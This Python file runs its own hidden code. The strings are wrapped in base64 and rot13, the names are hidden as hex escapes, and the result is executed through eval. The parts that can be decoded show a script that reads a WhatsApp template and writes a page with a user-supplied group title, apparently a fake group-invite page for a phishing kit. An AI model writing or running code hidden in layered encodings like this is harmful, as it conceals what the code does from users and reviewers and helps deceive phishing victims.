import base64, codecs
magic = 'IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKaW1wb3J0IG9zCmltcG9ydCBzaHV0aWwKClIgPSAnXDAzM1szMW0nICMgcmVkCkcgPSAnXDAzM1szMm0nICMgZ3JlZW4KQyA9ICdcMDMzWzM2bScgIyBjeWFuClcgPSAnXDAzM1swbScgICMgd2hpdGUKCnRpdGxlID0gaW5wdXQoRyArICdbK10nICsgQyArICcgR3JvdXAgVGl0bGUgOiAnICsgVykKaW'
love = '1uM2HtCFOcoaO1qPuUVPftW1feKFptXlOQVPftWlODLKEbVUEiVRqlo3IjVRygMlNbDzImqPOGnKcyVQbtZmNjrQZjZPx6VPptXlOKXDbXnJ1aK25uoJHtCFOcoJSaMF5mpTkcqPtaYlpcJl0kKDc0pax6PvNtVPOmnUI0nJjhL29jrJMcoTHbnJ1uM2HfVPq0MJ1joTS0MF93nTS0p2SjpP9coJSaMKZir30aYzMipz1uqPucoJqsozSgMFxcPzI4'
god = 'Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgIHByaW50KCdcbicgKyBSICsgJ1stXScgKyBDICsgJyBFeGNlcHRpb24gOiAnICsgVyArIHN0cihlKSkKICAgIGV4aXQoKQoKd2l0aCBvcGVuKCd0ZW1wbGF0ZS93aGF0c2FwcC9pbmRleF90ZW1wLmh0bWwnLCAncicpIGFzIGluZGV4X3RlbXA6CiAgICBjb2RlID0gaW5kZXhfdGVtcC5yZWFkKCkKIC'
destiny = 'NtVTAiMTHtCFOwo2EyYaWypTkuL2HbWlEHFIEZEFDaYPO0nKEfMFxXVPNtVTAiMTHtCFOwo2EyYaWypTkuL2HbWlEWGHSUEFDaYPNanJ1uM2ImY3g9Wl5zo3WgLKDbnJ1aK25uoJHcXDbXq2y0nPOipTIhXPq0MJ1joTS0MF93nTS0p2SjpP9cozEyrP5bqT1fWljtW3paXFOuplOhMKqsnJ5xMKt6PvNtVPOhMKqsnJ5xMKthq3WcqTHbL29xMFx='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
